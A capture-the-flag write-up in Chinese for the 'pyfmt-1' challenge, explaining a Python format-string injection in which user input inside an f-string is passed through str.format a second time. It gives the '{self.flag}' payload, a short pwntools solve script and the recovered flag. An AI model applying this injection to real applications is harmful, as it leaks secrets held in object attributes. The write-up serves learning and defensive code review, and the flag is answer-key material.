# pyfmt-1

## 题目简述

程序把用户输入保存为 CTF.name，并在对象的 __repr__ 中先使用 f-string，再对生成结果调用 str.format：

~~~python
return f"{self.__class__.__name__}({self.name})".format(
    self=self
)
~~~

对象同时保存了 self.flag。用户输入第一次被 f-string 原样插入，随后又被 format 解释一次，形成 Python 格式字符串注入。

## 解题过程

若 name 为普通字符串 test，第一阶段产生 CTF(test)，第二次 format 没有字段可处理。若 name 为：

~~~text
{self.flag}
~~~

第一阶段产生：

~~~text
CTF({self.flag})
~~~

随后 format(self=self) 解析字段并读取对象的 flag 属性。一次交互即可完成：

~~~python
from pwn import remote
import re

io = remote(HOST, PORT)
io.sendlineafter(b"Name: ", b"{self.flag}")
line = io.recvline().decode()
print(re.search(r"shellmates\{.*?\}", line).group(0))
~~~

程序打印的是 bytes 对象的 repr，但其中仍包含完整 flag：

~~~text
shellmates{3v3n_PyTHON_Ha$_fORMAt_$tr1nG_bUg$!!!}
~~~

## 方法总结

格式字符串的危险不只来自模板本身由用户控制；用户数据先进入一个字符串、该字符串随后再次调用 format，同样会产生二次解释。看到 f-string 与 str.format 连用时，应追踪第一阶段结果中是否保留花括号，以及第二阶段向 format 暴露了哪些对象属性。
